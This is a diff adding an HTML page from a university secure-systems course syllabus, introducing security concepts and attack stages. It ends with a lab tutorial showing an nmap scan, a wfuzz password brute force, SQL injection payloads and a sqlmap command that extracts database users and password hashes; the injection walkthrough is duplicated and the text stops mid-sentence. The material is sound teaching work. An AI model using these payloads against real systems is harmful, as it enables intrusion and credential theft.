@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>Introduction &#8212; Theory 2020 documentation</title>
+    <link rel="stylesheet" href="_static/bootstrap-sphinx.css" type="text/css" />
+    <link rel="stylesheet" href="_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="_static/css/my-style.css" type="text/css" />
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    './',
+        VERSION:     '2020',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true,
+        SOURCELINK_SUFFIX: '.txt'
+      };
+    </script>
+    <script type="text/javascript" src="_static/script.js"></script>
+    <link rel="index" title="Index" href="genindex.html" />
+    <link rel="search" title="Search" href="search.html" />
+    <link rel="next" title="Basic attacks/defences" href="basis/privilege.html" />
+    <link rel="prev" title="Welcome to Theory’s documentation!" href="index.html" />
+<meta charset='utf-8'>
+<meta http-equiv='X-UA-Compatible' content='IE=edge,chrome=1'>
+<meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1'>
+<meta name="apple-mobile-web-app-capable" content="yes">
+<script type="text/javascript" src="_static/js/jquery-1.11.0.min.js "></script>
+<script type="text/javascript" src="_static/js/jquery-fix.js "></script>
+<script type="text/javascript" src="_static/bootstrap-3.3.7/js/bootstrap.min.js "></script>
+<script type="text/javascript" src="_static/bootstrap-sphinx.js "></script>
+
+  </head>
+  <body>
+
+  <div id="navbar" class="navbar navbar-inverse navbar-default navbar-fixed-top">
+    <div class="container">
+      <div class="navbar-header">
+        <!-- .btn-navbar is used as the toggle for collapsed navbar content -->
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".nav-collapse">
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="index.html"><span><img src="_static/UCLouvain_Logo+moodle.png"></span>
+          LINGI2144</a>
+        <span class="navbar-text navbar-version pull-left"><b>2020</b></span>
+      </div>
+
+        <div class="collapse navbar-collapse nav-collapse">
+          <ul class="nav navbar-nav">
+            
+                <li><a href="https://github.com/ElNiak/LINGI2144-Secured-System-Engineering-Syllabus.git">GitHub</a></li>
+            
+            
+              <li class="dropdown globaltoc-container">
+  <a role="button"
+     id="dLabelGlobalToc"
+     data-toggle="dropdown"
+     data-target="#"
+     href="index.html">Section <b class="caret"></b></a>
+  <ul class="dropdown-menu globaltoc"
+      role="menu"
+      aria-labelledby="dLabelGlobalToc"><ul class="current">
+<li class="toctree-l1 current"><a class="current reference internal" href="#">Introduction</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="#objectives">Objectives</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#security-a-definition">Security: A definition ?</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#attackers-motivations">Attacker’s motivations</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#risk-analysis">Risk analysis</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#attacks-classification">Attacks classification</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#from-vulnerabilities-to-exploit">From vulnerabilities to exploit</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#some-counter-measures">Some counter measures</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#hardware-hack">Hardware Hack</a></li>
+<li class="toctree-l2"><a class="reference internal" href="#additional-content">Additional content</a></li>
+</ul>
+</li>
+<li class="toctree-l1"><a class="reference internal" href="basis/privilege.html">Basic attacks/defences</a><ul>
+<li class="toctree-l2"><a class="reference internal" href="basis/privilege.html#privileges-escalation">Privileges escalation</a></li>
+</ul>
+</li>
+</ul>
+</ul>
+</li>
+              
+            
+            
+            
+            
+            
+          </ul>
+
+          
+            
+<form class="navbar-form navbar-right" action="search.html" method="get">
+ <div class="form-group">
+  <input type="text" name="q" class="form-control" placeholder="Search" />
+ </div>
+  <input type="hidden" name="check_keywords" value="yes" />
+  <input type="hidden" name="area" value="default" />
+</form>
+          
+        </div>
+    </div>
+  </div>
+
+<div class="container">
+  <div class="row">
+      <div class="col-md-3">
+        <div id="sidebar" class="bs-sidenav" role="complementary">
+<form action="search.html" method="get">
+ <div class="form-group">
+  <input type="text" name="q" class="form-control" placeholder="Search" />
+ </div>
+  <input type="hidden" name="check_keywords" value="yes" />
+  <input type="hidden" name="area" value="default" />
+</form><ul>
+<li><a class="reference internal" href="#">Introduction</a><ul>
+<li><a class="reference internal" href="#objectives">Objectives</a><ul>
+<li><a class="reference internal" href="#hacking-tools">Hacking tools</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#security-a-definition">Security: A definition ?</a><ul>
+<li><a class="reference internal" href="#difference-between-safety-and-security">Difference between safety and security</a></li>
+<li><a class="reference internal" href="#cyber-security">Cyber security</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#attackers-motivations">Attacker’s motivations</a></li>
+<li><a class="reference internal" href="#risk-analysis">Risk analysis</a><ul>
+<li><a class="reference internal" href="#security-triad">Security triad</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#attacks-classification">Attacks classification</a></li>
+<li><a class="reference internal" href="#from-vulnerabilities-to-exploit">From vulnerabilities to exploit</a><ul>
+<li><a class="reference internal" href="#vulnerability-threat-attack">Vulnerability, Threat, Attack</a></li>
+<li><a class="reference internal" href="#timeline-of-an-attack">Timeline of an attack</a></li>
+<li><a class="reference internal" href="#spy-and-intrusion">Spy and intrusion</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#some-counter-measures">Some counter measures</a><ul>
+<li><a class="reference internal" href="#safe-links-database-example">Safe links - Database example</a></li>
+</ul>
+</li>
+<li><a class="reference internal" href="#hardware-hack">Hardware Hack</a></li>
+<li><a class="reference internal" href="#additional-content">Additional content</a><ul>
+<li><a class="reference internal" href="#finding-services-nmap">Finding services - <code class="docutils literal"><span class="pre">nmap</span></code></a></li>
+<li><a class="reference internal" href="#bruteforcing-wfuzz">Bruteforcing - <code class="docutils literal"><span class="pre">wfuzz</span></code></a></li>
+<li><a class="reference internal" href="#sql-injection-sqlmap">SQL Injection - <code class="docutils literal"><span class="pre">SQLMap</span></code></a></li>
+<li><a class="reference internal" href="#command-injection-metasploit">Command Injection - <code class="docutils literal"><span class="pre">Metasploit</span></code></a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+
+        </div>
+      </div>
+    <div class="body col-md-9 content" role="main">
+      
+  <hr class="docutils" />
+<div class="section" id="introduction">
+<h1>Introduction<a class="headerlink" href="#introduction" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="objectives">
+<h2>Objectives<a class="headerlink" href="#objectives" title="Permalink to this headline">¶</a></h2>
+<div class="line-block">
+<div class="line">The main objective of this course is to <strong>make sure that computer
+systems do not divert from their defined behavior</strong> since unexpected
+behaviors may have dramatic humain and economical effects. In the past
+most unexpected behaviors arose from mistakes involuntarily made by
+people, the objective was to remove those mistakes and there was no
+desire to exploit them.</div>
+</div>
+<p>Now the situation has changed, attackers are looking for weaknesses
+(often called <strong>vulnerabilities</strong>) <strong>deliberately “perturbate”</strong> a
+system which may be introduced <strong>intentionally</strong>. Our goal will be in
+the context of software :</p>
+<ol class="arabic simple">
+<li>To understand <strong>classical vulnerabilities</strong> (buffer overflow ,
+privileges escalation,…)</li>
+<li>To understand how they can be <strong>exploited</strong> in larger attacks shell ,
+backdoor,…)</li>
+<li>To <strong>mitigate</strong> those vulnerabilities as much as possible (canary,
+smatching ,…)</li>
+</ol>
+<div class="section" id="hacking-tools">
+<h3>Hacking tools<a class="headerlink" href="#hacking-tools" title="Permalink to this headline">¶</a></h3>
+<p>The course introduces vulnerabilities that lead to exploits. There is a
+wide range of pre-computed exploits to be applied but the objective is
+to create our own exploits and not only reusing ones.</p>
+</div>
+</div>
+<div class="section" id="security-a-definition">
+<h2>Security: A definition ?<a class="headerlink" href="#security-a-definition" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="difference-between-safety-and-security">
+<h3>Difference between safety and security<a class="headerlink" href="#difference-between-safety-and-security" title="Permalink to this headline">¶</a></h3>
+<table border="1" class="docutils">
+<colgroup>
+<col width="50%" />
+<col width="50%" />
+</colgroup>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head">Safety</th>
+<th class="head">Security</th>
+</tr>
+</thead>
+<tbody valign="top">
+<tr class="row-even"><td>Protect against fault <strong>unintended</strong> consequences. Defined by statistic
+on life duration of hardware.</td>
+<td>Protect against <strong>voluntary</strong> malicious actions. Cannot be quantified.</td>
+</tr>
+<tr class="row-odd"><td>Example: error hardware failure</td>
+<td>Example: deny of service, data theft</td>
+</tr>
+<tr class="row-even"><td>Deflect: backup</td>
+<td>Deflect: access control, filtering</td>
+</tr>
+</tbody>
+</table>
+<p>Safety helps security. As an example: disponibility. One tries to chose
+equipment that have a long lifetime and that are reliable (almost no
+bug).</p>
+</div>
+<div class="section" id="cyber-security">
+<h3>Cyber security<a class="headerlink" href="#cyber-security" title="Permalink to this headline">¶</a></h3>
+<p>Cyber security aims at <strong>reducing risks</strong> to limit their impact on the
+system. The objective is <strong>not obstruction</strong>, but to contribute to
+quality of service and to guarantee the right security level to workers.
+It has a <strong>financial cost</strong> whether you push for it or whether you let
+it be broken.</p>
+</div>
+</div>
+<div class="section" id="attackers-motivations">
+<h2>Attacker’s motivations<a class="headerlink" href="#attackers-motivations" title="Permalink to this headline">¶</a></h2>
+<p>During the old good day, the motivations was mainly for fun but
+nowadays, there is the rise of very organized cyber delinquency with
+main objectives to damage, to harm money, politics, religion, concurrent
+organization, mercenaries, …</p>
+<p>These new web-based financial organization are compose of various
+actors,</p>
+<ul class="simple">
+<li>Group of specialist in vulnerability analysis, malwares, exploits,
+… ( TECos)</li>
+<li>And groups to exploit and commercialize services to conduct cyber
+security attacks. (i.e Host site to store malicious content, Groups
+who sell stolen data, mostly banking ones, Financial intermediary to
+store the money, …)</li>
+</ul>
+<p>The potential objectives and consequence are vast but it usually concern
+either financial reward, either resources stealing, either
+blackmail/extortion, or even intelligence gathering which can lead to
+privacy/reputation issues, lose of data, identity theft and have
+financial impacts ( black hat). Not hackers are bad guys, some
+of them have as main objective to find vulnerabilities and force
+correction( white hat).</p>
+</div>
+<div class="section" id="risk-analysis">
+<h2>Risk analysis<a class="headerlink" href="#risk-analysis" title="Permalink to this headline">¶</a></h2>
+<p>As time goes on, the standards and guidelines for cyber security will
+become more stringent, even though it is currently cheaper to ignore
+these issues until an attack occurs. Companies have to conduct security
+audits, GDPR imposes security referent (RSSI) to each company even small
+ones. Norms exists to perform risk analysis (ISO 27001, …) Most of
+time, they’re adapted from financial risk. Norms frame what has to be
+checked, the security attributes, but not how to check them.</p>
+<div class="section" id="security-triad">
+<h3>Security triad<a class="headerlink" href="#security-triad" title="Permalink to this headline">¶</a></h3>
+<p>Criteria used to define security levels of an IS and is used as a metric
+to evaluate its security.</p>
+<ol class="arabic simple">
+<li><strong>Disponibity</strong> : Can be accessed <strong>when needed by those who are
+allowed</strong>, those who are not allowed should not forbid access to
+those who are allowed.</li>
+<li><strong>Integrity</strong> : <strong>Must be exact and complete</strong>. Should not be
+modified in an illegal illegitimate manner, but only by those who are
+allowed</li>
+<li><strong>Confidentiality</strong> : Can only be accessed by <strong>those who are
+allowed</strong>, and forbid them to disclose information to those who are
+not allowed to access it</li>
+</ol>
+<p>Risk analysis is a core business and is proven to save money. Can be
+free (EBIOS by ANSSI) or expensive (Octave, Cramm, String). Can be
+dedicated to a specific business or general but in reality cannot be
+entirely deployed because they are too wide/complex.</p>
+</div>
+</div>
+<div class="section" id="attacks-classification">
+<h2>Attacks classification<a class="headerlink" href="#attacks-classification" title="Permalink to this headline">¶</a></h2>
+<ul class="simple">
+<li><strong>Indiscriminate attacks</strong> (petya, red october [malware collects many
+things], …) are wide ranging and global, <em>without specific target</em></li>
+<li><strong>Destructive attacks</strong> (TV5, operation ababil [us, financial], ..)
+relate to inflicting damage on <em>specific organizations</em></li>
+<li><strong>Cyberwarfare attacks</strong> (Estonia , Burma, …) are <em>politically
+motivated</em> destructive attacks aimed at sabotage and espionage.</li>
+<li><strong>Government espionage attack</strong> (ghostnet , …) aim at <em>stealing
+government informations</em></li>
+<li><strong>Corporate espionage attacks</strong> (operation socialists, …) aim at
+<em>stealing proprietary methods</em></li>
+<li>Other <strong>private life oriented attacks</strong> aim at <em>stealing credit card/
+financial data</em> and <em>stealing medical related data</em></li>
+</ul>
+</div>
+<div class="section" id="from-vulnerabilities-to-exploit">
+<h2>From vulnerabilities to exploit<a class="headerlink" href="#from-vulnerabilities-to-exploit" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="vulnerability-threat-attack">
+<h3>Vulnerability, Threat, Attack<a class="headerlink" href="#vulnerability-threat-attack" title="Permalink to this headline">¶</a></h3>
+<p>An attack only occurs if a vulnerability exists, so the first goal of an
+attacker is to find such a vulnerability where the potential <strong>surface
+of attack</strong> is large (e.g connected car with many components). It goes
+from software or hardware to their interactions and connections.</p>
+<p>#TODO add figure</p>
+</div>
+<div class="section" id="timeline-of-an-attack">
+<h3>Timeline of an attack<a class="headerlink" href="#timeline-of-an-attack" title="Permalink to this headline">¶</a></h3>
+<p>There is no clear definition of what are cyber attack steps but here are
+the main ones :</p>
+<ol class="arabic">
+<li><div class="first line-block">
+<div class="line"><strong>Spy</strong>: Find a vulnerability to access the system (fishing, buffer
+overflow, …)</div>
+<div class="line"><em>Software vulnerability via memory time and space issues</em></div>
+</div>
+</li>
+<li><div class="first line-block">
+<div class="line"><strong>Intrusion</strong>: Exploit vulnerability to get an access to the system</div>
+<div class="line"><em>Buffer overflow and format string over flow</em></div>
+</div>
+</li>
+<li><div class="first line-block">
+<div class="line"><strong>Escalation/spread</strong>: Escalade privileges (root, get access to
+other user account of the system)</div>
+<div class="line"><em>Root access for linux systems</em></div>
+</div>
+</li>
+<li><div class="first line-block">
+<div class="line"><strong>Attack</strong>: Break one or more cyber security attribute</div>
+<div class="line"><em>Mirai Malware</em></div>
+</div>
+</li>
+<li><div class="first line-block">
+<div class="line"><strong>Disappear</strong>: Elimination of traces of activities</div>
+<div class="line"><em>Not done here</em></div>
+</div>
+</li>
+</ol>
+<p>Example :</p>
+<ol class="arabic simple">
+<li>Pirate spies the system and notices that a ssh service remains open
+on a remote machine via username password access only (SSH ports and
+services should not be opened  Fishing and
+backdoors and buffer overflow)</li>
+<li>Pirate brute forces the access using <em>john the ripper</em> software and
+get access</li>
+<li>Pirate notices that python is installed and can be launched with
+<code class="docutils literal"><span class="pre">sudo</span></code> command. From there he gets access to any account in the
+system (Python should not be started with sudo 
+Kernel and Cron exploit)</li>
+<li>Pirate changes the password of all users</li>
+<li>Pirate cleans the logs of the system and disconnect</li>
+</ol>
+</div>
+<div class="section" id="spy-and-intrusion">
+<h3>Spy and intrusion<a class="headerlink" href="#spy-and-intrusion" title="Permalink to this headline">¶</a></h3>
+<p>There are two common ways to access a computer:</p>
+<ol class="arabic">
+<li><p class="first"><strong>Fishing</strong>: is often a first step to gain access , before privilege
+escalation (and technical), two times more aggressive for individuals
+than companies.</p>
+<ul class="simple">
+<li>Do not pay, probably fake and easily checked on Google.</li>
+</ul>
+</li>
+<li><p class="first"><strong>Technical</strong> (backdoor, password hack, protocol abuse, …)</p>
+<ol class="arabic simple">
+<li>Find open port/service</li>
+<li>Hack password (john the riper)</li>
+<li>Buffer oveflow messages in exchange protocols</li>
+<li>Exploit a backdoor (Eternalblue)</li>
+<li>…</li>
+</ol>
+<p>Can be found on : <a class="reference external" href="https://www.cvedetails.com/">https://www.cvedetails.com/</a>. We can also use the
+<strong>Metasploit Framework</strong> is an open source penetration testing and
+development platform that provides exploits for a variety of
+applications, operating systems and platforms. Metasploit is one of
+the most commonly used penetration testing tools and comes built-in
+to Kali Linux.</p>
+<p>The main components of the Metasploit Framework are called modules.
+Modules are standalone pieces of code or software that provide
+functionality to Metasploit. There are six total modules: exploits
+(takes advantage of a system’s vulnerability and installs a payload),
+payloads (gives access to the system by a variety of methods),
+auxiliary, nops, posts, and encoders.</p>
+</li>
+</ol>
+</div>
+</div>
+<div class="section" id="some-counter-measures">
+<h2>Some counter measures<a class="headerlink" href="#some-counter-measures" title="Permalink to this headline">¶</a></h2>
+<p>Counter measures helps to perceive the system to be safer but this is
+not always the case, and a counter measure may be vulnerable.</p>
+<table border="1" class="docutils">
+<colgroup>
+<col width="50%" />
+<col width="50%" />
+</colgroup>
+<thead valign="bottom">
+<tr class="row-odd"><th class="head">Some known</th>
+<th class="head">More technical</th>
+</tr>
+</thead>
+<tbody valign="top">
+<tr class="row-even"><td>No &#64; in URLs</td>
+<td>Artificial intelligence</td>
+</tr>
+<tr class="row-odd"><td>Check domain’s name and Certificats</td>
+<td>Stack/ heap /compiler protections</td>
+</tr>
+<tr class="row-even"><td>Anti-spam and anti-virus</td>
+<td>Static and dynamic validation tools</td>
+</tr>
+<tr class="row-odd"><td>Software update</td>
+<td>&#160;</td>
+</tr>
+</tbody>
+</table>
+<div class="section" id="safe-links-database-example">
+<h3>Safe links - Database example<a class="headerlink" href="#safe-links-database-example" title="Permalink to this headline">¶</a></h3>
+<p>When someone clicks on a URL in an email, Safe Links (anti-virus/static)
+checks if it is malicious or safe before rendering the webpage in the
+user’s browser. This is done via static comparison with Microsoft
+database. If the URL is identified as insecure, the user is taken to a
+page displaying a warning message asking them if they wish to continue
+to the unsafe destination.</p>
+<div class="line-block">
+<div class="line">Example for url <a class="reference external" href="https://www.avanan.com">https://www.avanan.com</a> which is used as :
+<a class="reference external" href="https://na01.safelinks.protection.outlook.com/?url=www.avanan.com">https://na01.safelinks.protection.outlook.com/?url=www.avanan.com</a></div>
+<div class="line">This is unsafe/not ultimate:</div>
+</div>
+<ul>
+<li><p class="first">NSA could collaborate with Microsoft (intentional backdoor)</p>
+</li>
+<li><p class="first">Safe Links does not dynamically scan URLs: it only verifies if the
+URL is on known blacklists of malicious sites. It struggles to detect
+zero day, unknown URLs.</p>
+</li>
+<li><p class="first">Safe Links can’t act on detection Across Mailboxes: identifies a
+malicious URL, it does not generate an alert to notify admin of
+instances of the same link in other user mailboxes.</p>
+</li>
+<li><div class="first line-block">
+<div class="line">Safe Links scan doesn’t apply safe links to domains that are white
+listed by Microsoft. Popular sites like Google.com are given a
+pass. Danger: “Open Redirect”.</div>
+<div class="line">Problems: Google never said it will check links … and it trusts its
+ow domain! Google redirect vulnerability: send your secretary a
+mail with the following link</div>
+</div>
+<p><img alt="image" src="imageTP/8.PNG" /></p>
+</li>
+</ul>
+<p>“When Safe Links used to rewrite URLs, it created a false sense of
+security that misled users, and undermined efforts to encourage people
+to inspect URLs for misspellings or other suspicious indicators. Now
+that Safe Links leverages Native Link Rendering to preserve the original
+URL for the end user, Safe Links deserves the name. However, there are
+still some obscure workarounds that hackers can employ to interfere with
+the protection available in Microsoft ATP”</p>
+</div>
+</div>
+<div class="section" id="hardware-hack">
+<h2>Hardware Hack<a class="headerlink" href="#hardware-hack" title="Permalink to this headline">¶</a></h2>
+<p>It is expected that attack surface is at software level. However , it is
+not always the case: <strong>hardware surface</strong> shall be considered.</p>
+<ul class="simple">
+<li>Hardware from IoT or even family computers offers a wide range of
+perspectives</li>
+<li>Some are still at proof concept level . Ex: Frozen Memory Hack</li>
+<li>Others are already deployed . Ex: hardware keylogger (Keylogger are
+software that records the keys struck on a keyboard, used to spy but
+must be installed directly on computer, Hardware keylogger do the
+same but at hardware level)</li>
+</ul>
+</div>
+<div class="section" id="additional-content">
+<h2>Additional content<a class="headerlink" href="#additional-content" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="finding-services-nmap">
+<h3>Finding services - <code class="docutils literal"><span class="pre">nmap</span></code><a class="headerlink" href="#finding-services-nmap" title="Permalink to this headline">¶</a></h3>
+<p><code class="docutils literal"><span class="pre">nmap</span> <span class="pre">&lt;option&gt;</span> <span class="pre">&lt;IP&gt;</span></code></p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>nmap -A -T4 localhost
+
+Starting Nmap <span class="o">(</span> http://nmap.org <span class="o">)</span>
+Nmap scan report <span class="k">for</span> felix <span class="o">(</span><span class="m">127</span>.0.0.1<span class="o">)</span>
+<span class="o">(</span>The <span class="m">1640</span> ports scanned but not shown below are in state: closed<span class="o">)</span>
+PORT     STATE SERVICE    VERSION
+<span class="m">21</span>/tcp   open  ftp        WU-FTPD wu-2.6.1-20
+<span class="m">22</span>/tcp   open  ssh        OpenSSH <span class="m">3</span>.1p1 <span class="o">(</span>protocol <span class="m">1</span>.99<span class="o">)</span>
+<span class="m">53</span>/tcp   open  domain     ISC BIND <span class="m">9</span>.2.1
+<span class="m">79</span>/tcp   open  finger     Linux fingerd
+<span class="m">111</span>/tcp  open  rpcbind    <span class="m">2</span> <span class="o">(</span>rpc <span class="c1">#100000)</span>
+<span class="m">443</span>/tcp  open  ssl/http   Apache httpd <span class="m">2</span>.0.39 <span class="o">((</span>Unix<span class="o">)</span> mod_perl/1.99_04-dev<span class="o">)</span>
+<span class="m">515</span>/tcp  open  printer
+<span class="m">631</span>/tcp  open  ipp        CUPS <span class="m">1</span>.1
+...
+<span class="m">8000</span>/tcp open  http-proxy Junkbuster webproxy
+<span class="m">8080</span>/tcp open  http       Apache httpd <span class="m">2</span>.0.39 <span class="o">((</span>Unix<span class="o">)</span> mod_perl/1.99_04-dev<span class="o">)</span>
+<span class="m">8081</span>/tcp open  http       Apache httpd <span class="m">2</span>.0.39 <span class="o">((</span>Unix<span class="o">)</span> mod_perl/1.99_04-dev<span class="o">)</span>
+Device type: general purpose
+Running: Linux <span class="m">2</span>.4.X<span class="p">|</span><span class="m">2</span>.5.X
+OS details: Linux Kernel <span class="m">2</span>.4.0 - <span class="m">2</span>.5.20
+</pre></div>
+</div>
+</div>
+<div class="section" id="bruteforcing-wfuzz">
+<h3>Bruteforcing - <code class="docutils literal"><span class="pre">wfuzz</span></code><a class="headerlink" href="#bruteforcing-wfuzz" title="Permalink to this headline">¶</a></h3>
+<div class="line-block">
+<div class="line">For URL such that:
+<a class="reference external" href="http://172.17.0.2/gallery.php">http://172.17.0.2/gallery.php</a>?password=THE_PASS_YOU_TRIED&amp;Login=Login#</div>
+<div class="line">You could then see that the “password” argument is the password you
+entered, change that parameter and test. again</div>
+</div>
+<p><code class="docutils literal"><span class="pre">wfuzz</span> <span class="pre">-w</span> <span class="pre">&lt;dicPath&gt;</span> <span class="pre">&quot;URL&quot;</span></code></p>
+<div class="line-block">
+<div class="line">We suggest using <code class="docutils literal"><span class="pre">wfuzz</span></code> to perform a dictionary attack.</div>
+<div class="line">A good dictionary can be found at
+<code class="docutils literal"><span class="pre">/usr/share/wfuzz/wordlist/others/common_pass.txt</span></code></div>
+<div class="line">We should also replace the URL like:
+<a class="reference external" href="http://172.17.0.2/gallery.php">http://172.17.0.2/gallery.php</a>?password=FUZZ&amp;Login=Login#</div>
+<div class="line">Now, observe the output of <code class="docutils literal"><span class="pre">wfuzz</span></code>, it will give you the HTTP return
+code (normally <code class="docutils literal"><span class="pre">200/OK</span></code>) and the number of characters, lines and
+words on the page it received while trying that password. <em>The
+“Incorrect Password” page contains 10 Lines and 37 Words</em>. Look if one
+line is different, meaning that that password has got a different
+result. Try that password on the website.</div>
+</div>
+<p><img alt="image" src="imageTP/8.PNG" /></p>
+</div>
+<div class="section" id="sql-injection-sqlmap">
+<h3>SQL Injection - <code class="docutils literal"><span class="pre">SQLMap</span></code><a class="headerlink" href="#sql-injection-sqlmap" title="Permalink to this headline">¶</a></h3>
+<p>Imagine you can interact with a database such that:</p>
+<p><img alt="image" src="imageTP/8.PNG" /></p>
+<ul>
+<li><p class="first">Now think about the SQL Query that must be executed to look into that
+database. When you have a clear idea, look at the next line.</p>
+</li>
+<li><p class="first">The query used is most likely something like
+<code class="docutils literal"><span class="pre">&quot;SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">cats</span> <span class="pre">WHERE</span> <span class="pre">id=PARAM&quot;</span></code>.</p>
+</li>
+<li><div class="first line-block">
+<div class="line">SQL commands support operators like AND or OR. Try to use a OR to
+dump the content of the whole table. When you’re done read the next
+line. Using a OR you can dump the whole table by using the query
+<code class="docutils literal"><span class="pre">&quot;SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">cats</span> <span class="pre">WHERE</span> <span class="pre">id=1</span> <span class="pre">OR</span> <span class="pre">1=1&quot;</span></code> (see picture just above)</div>
+<div class="line">This query works because the OR condition is always true, so every
+entry in the database is selected and returned.</div>
+</div>
+</li>
+<li><p class="first">Now that we know that we can inject commands, we can try some more
+interesting commands like <code class="docutils literal"><span class="pre">&quot;1</span> <span class="pre">OR</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">user()</span> <span class="pre">#&quot;</span></code>.
+This command will give you the username used to connect to the
+database.</p>
+</li>
+<li><p class="first">Now we would like to know if some information about our cats are
+hidden. For instance, their microchip is probably there but hidden.
+Let’s see if we can display it.</p>
+</li>
+<li><p class="first">First, let’s find the name of the table used to store our cats.
+“cats” is probably a good guess but let’s check it by using
+<code class="docutils literal"><span class="pre">&quot;1</span> <span class="pre">AND</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">table_name</span> <span class="pre">FROM</span> <span class="pre">information_schema.tables</span> <span class="pre">WHERE</span> <span class="pre">table_name</span> <span class="pre">LIKE</span> <span class="pre">'cats%'#&quot;</span></code>
+as an input.</p>
+</li>
+<li><p class="first">The answer should show you “cats” next to the birth date, meaning
+that a table cats exists (you can try with other names)</p>
+</li>
+<li><p class="first">Now that we’re sure that our table is called “cats” let’s try to find
+the name of the rows by using the input
+<code class="docutils literal"><span class="pre">&quot;1</span> <span class="pre">AND</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">concat(table_name,0x0a,column_name)</span> <span class="pre">FROM</span> <span class="pre">information_schema.columns</span> <span class="pre">WHERE</span> <span class="pre">table_name</span> <span class="pre">=</span> <span class="pre">'cats'</span> <span class="pre">#&quot;</span></code>.
+The result of this command will show you that this table has 4 rows:
+<code class="docutils literal"><span class="pre">id,</span> <span class="pre">name,</span> <span class="pre">birth_date</span></code> and <code class="docutils literal"><span class="pre">chip</span></code>. Great our chip <code class="docutils literal"><span class="pre">id</span></code> is here
+and called <code class="docutils literal"><span class="pre">chip</span></code>.</p>
+</li>
+</ul>
+<div class="line-block">
+<div class="line">As we’ve seen, an SQL Injection allow to read data we aren’t supposed
+to read. But what’s interesting is if the user used by the website has
+admin privileges, we could even try to read the informations about
+other databases or SQL users. But these queries are pretty complex, so
+let’s use a tool for that.</div>
+<div class="line">SQLMap is a tool that will perform SQL injections for you, so let’s
+try it. Run sqlmap with the command:</div>
+</div>
+<p><code class="docutils literal"><span class="pre">sqlmap</span> <span class="pre">-u</span> <span class="pre">&quot;http://172.17.0.2/cats.php?id=1&amp;Submit=Submit&quot;</span> <span class="pre">--string=&quot;Name&quot;</span> <span class="pre">--users</span> <span class="pre">--password</span></code></p>
+<p>SQLMap will first scan the database for injectable parameters. Then, it
+will extract (if possible) a list of the users and their hashed
+password. Upon success, sqlmap will try a bruteforce attack on the
+hashed passwords it extracted. When done, sqlmap should show you the
+login and passwords of several SQL users, write them</p>
+<ul>
+<li><p class="first">Now think about the SQL Query that must be executed to look into that
+database. When you have a clear idea, look at the next line.</p>
+</li>
+<li><p class="first">The query used is most likely something like
+<code class="docutils literal"><span class="pre">&quot;SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">cats</span> <span class="pre">WHERE</span> <span class="pre">id=PARAM&quot;</span></code>.</p>
+</li>
+<li><div class="first line-block">
+<div class="line">SQL commands support operators like AND or OR. Try to use a OR to
+dump the content of the whole table. When you’re done read the next
+line. Using a OR you can dump the whole table by using the query
+<code class="docutils literal"><span class="pre">&quot;SELECT</span> <span class="pre">*</span> <span class="pre">FROM</span> <span class="pre">cats</span> <span class="pre">WHERE</span> <span class="pre">id=1</span> <span class="pre">OR</span> <span class="pre">1=1&quot;</span></code> (see picture just above)</div>
+<div class="line">This query works because the OR condition is always true, so every
+entry in the database is selected and returned.</div>
+</div>
+</li>
+<li><p class="first">Now that we know that we can inject commands, we can try some more
+interesting commands like <code class="docutils literal"><span class="pre">&quot;1</span> <span class="pre">OR</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">user()</span> <span class="pre">#&quot;</span></code>.
+This command will give you the username used to connect to the
+database.</p>
+</li>
+<li><p class="first">Now we would like to know if some information about our cats are
+hidden. For instance, their microchip is probably there but hidden.
+Let’s see if we can display it.</p>
+</li>
+<li><p class="first">First, let’s find the name of the table used to store our cats.
+“cats” is probably a good guess but let’s check it by using
+<code class="docutils literal"><span class="pre">&quot;1</span> <span class="pre">AND</span> <span class="pre">1=0</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">null,</span> <span class="pre">table_name</span> <span class="pre">FROM</span> <span class="pre">information_schema.tables</span> <span class="pre">WHERE</span> <span class="pre">table_name</span> <span class="pre">LIKE</span> <span class="pre">'cats%'#&quot;</span></code>
+as an input.</p>
+</li>
+<li><p class="first">The answer should show you “cats” next to the birth date, meaning
+that a table cats exists (you can try with other names)</p>
+</li>
+<li><p class="first">Now that we’re sure that our table is called “cats” let’s try to find
+the name of the rows by using the input
